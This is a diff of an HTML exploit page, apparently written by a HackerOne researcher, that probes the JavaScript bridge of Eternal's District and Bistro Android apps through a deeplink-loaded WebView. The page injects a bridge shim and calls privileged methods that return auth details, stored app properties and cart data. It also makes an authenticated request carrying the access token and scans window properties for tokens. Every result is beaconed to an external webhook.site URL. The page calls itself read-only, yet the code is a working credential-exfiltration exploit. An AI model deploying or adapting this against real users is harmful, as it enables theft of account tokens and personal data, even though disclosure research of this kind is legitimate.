@@ -1,20 +1,12 @@
 <!DOCTYPE html>
 <!--
     Cross-app JS-bridge probe for the Eternal (HackerOne) sibling apps.
-
-    Purpose (STATIC finding this confirms):
-      attachments/district_bistro_bridge_inventory.md concludes that District
-      (com.application.zomato.district) attaches the privileged ZWebKitBridge
-      via PLAIN addJavascriptInterface (no origin lock) on the attacker-reachable
-      deeplink  district://webview?url=<THIS PAGE> , and that several bridge
-      methods return a credential / PII / authenticated-request response to any
-      web origin. Bistro (com.blinkit.bistro) attaches a JsBridge on
-      bistro://web-internal?url=<THIS PAGE> but its one token method is host-gated.
-
-    This page is the DYNAMIC confirm. It is sterile on disk: it only READS and
-    beacons; it does not transmit a credential anywhere except the researcher's
-    own webhook, and it does not fire any mutating/protected
-    action (no payments, no performActions, no order mutation).
+    DYNAMIC confirm of the static finding in
+    attachments/district_bistro_bridge_inventory.md (District ZWebKitBridge via
+    plain addJavascriptInterface, no origin lock, reachable from
+    district://webview?url=<attacker>). Read-only: only READS and beacons to the
+    researcher's own webhook; fires no mutating/protected action.
+    v2 - clean, syntax-valid bridge shim (v1 ensureZKit had a parse error).
 -->
 <html>
 <head>
@@ -32,7 +24,6 @@
 </head>
 <body>
 
-<!-- (1) BANNER -->
 <div class="banner">
   SECURITY RESEARCH PROBE — NOT A REAL PAGE. RESEARCHER: ktmj@HackerOne
   <small>Static basis: attachments/district_bistro_bridge_inventory.md. Read-only. No credential leaves this page except to the researcher's own webhook; no mutating/protected action is fired.</small>
@@ -40,23 +31,22 @@
 
 <div class="wrap">
   <h1>Eternal sibling-app JS-bridge probe</h1>
-  <pre id="log">booting...\n</pre>
+  <pre id="log">booting
+</pre>
 </div>
 
 <script>
-// (2) Beacon sink.
 var WEBHOOK = "https://webhook.site/46fabf84-f458-4e57-b7c0-fd547f395ebb";
 var log = document.getElementById('log');
 
 function send(label, data) {
   var s;
   try { s = (typeof data === 'string') ? data : JSON.stringify(data); } catch (e) { s = String(data); }
-  log.textContent += label + ": " + s + "\n";
+  if (log) { log.textContent += label + ": " + s + "\n"; }
   var img = new Image();
   img.src = WEBHOOK + "?l=" + encodeURIComponent(label) + "&d=" + encodeURIComponent(s).slice(0, 1800);
 }
 
-// (3) Enumerate a global: typeof + own property names + prototype method names.
 function describe(name) {
   var g;
   try { g = window[name]; } catch (e) { return { present: false, err: String(e) }; }
@@ -71,9 +61,10 @@ function describe(name) {
 }
 
 function enumerateAll() {
-  ['ZKit', 'JSBridge', 'ZWebKitBridge', 'JsBridge', 'Android'].forEach(function (n) {
-    send('globals_' + n, describe(n));
-  });
+  var names = ['ZKit', 'JSBridge', 'ZWebKitBridge', 'JsBridge', 'Android'];
+  for (var i = 0; i < names.length; i++) {
+    send('globals_' + names[i], describe(names[i]));
+  }
   send('globals_flags', {
     hasZKit: typeof window.ZKit !== 'undefined',
     hasJSBridge: typeof window.JSBridge !== 'undefined',
@@ -85,54 +76,45 @@ function enumerateAll() {
   });
 }
 
-// (4) Bundled byte-identical android-bridge.js shim.
+// Clean, syntax-valid shim equivalent to android-bridge.js:
+// ZKit.call(name, params, cb) posts {bridgeName,params,msgType:'call',callbackId}
+// to the native ZWebKitBridge.postMessage; native replies via ZKit.invokeJS(...).
+var __cb = {};
+function __invokeJS(t) {
+  try {
+    t = (t && t.constructor === String) ? JSON.parse(t) : t;
+    var r = (t.responseData && t.responseData.constructor === String) ? JSON.parse(t.responseData) : t.responseData;
+    var c = (t.metaData && t.metaData.constructor === String) ? JSON.parse(t.metaData) : t.metaData;
+    if (t.msgType === "internal" && t.bridgeName) {
+      if (t.bridgeName === "phoenixConfig") window.phoenixConfig = r;
+      return;
+    }
+    var o = __cb[t.callbackId];
+    if (!o) return;
+    if (!t.keepCallback) delete __cb[t.callbackId];
+    if (typeof o === "function") o(r, c);
+  } catch (e) { send('invokeJS_err', String(e)); }
+}
+function __call(bridgeName, params, cb, metaData) {
+  var id = bridgeName + "_" + (new Date).getTime() + "_" + Math.random();
+  if (typeof cb === "function") __cb[id] = cb;
+  var msg = { bridgeName: bridgeName, params: (params || null), msgType: "call", callbackId: id, metaData: (metaData || null) };
+  try { ZWebKitBridge.postMessage(JSON.stringify(msg)); } catch (e) { send('postMessage_err', String(e)); }
+}
+function __subscribe(bridgeName, params, cb, metaData) {
+  if (typeof cb === "function") __cb[bridgeName] = cb;
+  var msg = { bridgeName: bridgeName, params: (params || null), msgType: "subscribe", callbackId: bridgeName, metaData: (metaData || null) };
+  try { ZWebKitBridge.postMessage(JSON.stringify(msg)); } catch (e) { send('subscribe_err', String(e)); }
+}
 function ensureZKit() {
-  if (typeof window.ZKit !== 'undefined' && window.ZKit && typeof window.ZKit.call === 'function') return true;
-  if (typeof window.ZWebKitBridge === 'undefined') return false; // native interface absent -> cannot build
-  (function () {
-    var e, t, a, n;
-    window.ZKit = window.JSBridge = (e = {}, t = [], a = {
-      pI: "INITIALIZING_ZKit_JS v0.0.2", pIZ: "ZKit_JS v0.0.2_INITIALIZED",
-      nC: "Callback DOESNOT_EXIST", bRE: ["ZKitReady", "JSBridgeReady"]
-    }, (n = {
-      bridgeRequest: function (o) {
-        var t = o.bridgeName, a = o.params, r = o.callback, c = o.msgType, i = o.callbackId, m = o.metaData;
-        if (t && t.constructor === String) {
-          if (a && a.constructor === Function) { r = a; a = null; }
-          else if (a && a.constructor !== Object) a = null;
-          if (r && r.constructor === Function) e[i] = r;
-          if (m && m.constructor !== Object) m = null;
-          n.mLog({ bridgeName: t, params: a, msgType: c, callbackId: i, metaData: m });
-        }
-      },
-      mLog: function (o) {
-        if (Object.prototype.hasOwnProperty.call(o, "bridgeName")) {
-          var a = JSON.stringify(o);
-          try { ZWebKitBridge.postMessage(a); } catch (x) { }
-        }
-      },
-      subscribe: function (b, p, cb, md) { n.bridgeRequest({ bridgeName: b, params: p, callback: cb, msgType: "subscribe", callbackId: b, metaData: md }); },
-      call: function (b, p, cb, md) {
-        var c = b + "_" + (new Date).getTime() + Math.random();
-        n.bridgeRequest({ bridgeName: b, params: p, callback: cb, msgType: "call", callbackId: c, metaData: md });
-      },
-      unsubscribe: function (b, p, cb, md) { n.bridgeRequest({ bridgeName: b, params: p, callback: cb, msgType: "unsubscribe", callbackId: b, metaData: md }); },
-      invokeJS: function (t) {
-        t = (t && t.constructor === String) ? JSON.parse(t) : t;
-        var r = (t.responseData && t.responseData.constructor === String) ? JSON.parse(t.responseData) : t.responseData;
-        var c = (t.metaData && t.metaData.constructor === String) ? JSON.parse(t.metaData) : t.metaData;
-        if (t.msgType === "internal" && t.bridgeName) { if (t.bridgeName === "phoenixConfig") window.phoenixConfig = r; return; }
-        var o = e[t.callbackId];
-        if (!o) return;
-        if (!t.keepCallback) delete e[t.callbackId];
-        if (o && o.constructor === Function) o(r, c);
-      }
-    }).init = function () { }, { call: n.call, postMessage: n.call, invokeJS: n.invokeJS, subscribe: n.subscribe, unsubscribe: n.unsubscribe }));
-  })();
-  return (typeof window.ZKit !== 'undefined' && typeof window.ZKit.call === 'function');
+  if (window.ZKit && typeof window.ZKit.call === "function") return true;
+  if (typeof window.ZWebKitBridge === "undefined") return false;
+  var api = { call: __call, postMessage: __call, invokeJS: __invokeJS, subscribe: __subscribe };
+  window.ZKit = api;
+  if (typeof window.JSBridge === "undefined") window.JSBridge = api;
+  return (window.ZKit && typeof window.ZKit.call === "function");
 }
 
-// (5) District sensitive read-only probes.
 function probeDistrict() {
   if (!ensureZKit()) { send('district', 'ZKit/ZWebKitBridge not available on this origin'); return; }
   function cb(tag) { return function (resp, meta) { send('district_' + tag, { resp: resp, meta: meta }); }; }
@@ -140,7 +122,6 @@ function probeDistrict() {
   try { window.ZKit.call('userAuthDetails', { isLoginRequired: false }, cb('userAuthDetails')); } catch (e) { send('district_userAuthDetails_err', String(e)); }
   try { window.ZKit.call('getCity', {}, cb('getCity')); } catch (e) { send('district_getCity_err', String(e)); }
   try { window.ZKit.call('getAppStoredProperties', {}, cb('getAppStoredProperties')); } catch (e) { send('district_getAppStoredProperties_err', String(e)); }
-  // Authenticated-proxy probe: a GET to YOUR OWN webhook with is_authenticated=true.
   try {
     window.ZKit.call('httpRequest', {
       method: 'GET',
@@ -149,11 +130,9 @@ function probeDistrict() {
       authentication: { is_authenticated: true, header_key: 'access_token' }
     }, cb('httpRequest'));
   } catch (e) { send('district_httpRequest_err', String(e)); }
-  // NOTE: 'payments', 'zMoneyWallet', 'shared_prefs' (write), 'performActions'
-  // mutating/protected bridges are intentionally NOT invoked by this probe.
+  // payments / zMoneyWallet / shared_prefs(write) / performActions intentionally NOT invoked.
 }
 
-// (6) Bistro read-only probes.
 function probeBistro() {
   if (typeof window.JsBridge === 'undefined') { send('bistro', 'JsBridge not available on this origin'); return; }
   try { send('bistro_getCartData', String(window.JsBridge.getCartData())); } catch (e) { send('bistro_getCartData_err', String(e)); }
@@ -167,7 +146,6 @@ function runAll(tag) {
   probeBistro();
 }
 
-// (8) token-like top-level property sweep.
 function windowScan() {
   var interesting = {};
   for (var k in window) {
@@ -178,11 +156,10 @@ function windowScan() {
   send('window_props', interesting);
 }
 
-// boot + (7) retries
-runAll('t0');
-setTimeout(function () { runAll('t1'); }, 1000);
-setTimeout(function () { runAll('t3'); }, 3000);
-setTimeout(function () { runAll('t5'); windowScan(); }, 5000);
+try { runAll('t0'); } catch (e) { send('runAll_err_t0', String(e)); }
+setTimeout(function () { try { runAll('t1'); } catch (e) { send('runAll_err_t1', String(e)); } }, 1000);
+setTimeout(function () { try { runAll('t3'); } catch (e) { send('runAll_err_t3', String(e)); } }, 3000);
+setTimeout(function () { try { runAll('t5'); windowScan(); } catch (e) { send('runAll_err_t5', String(e)); } }, 5000);
 </script>
 </body>
 </html>
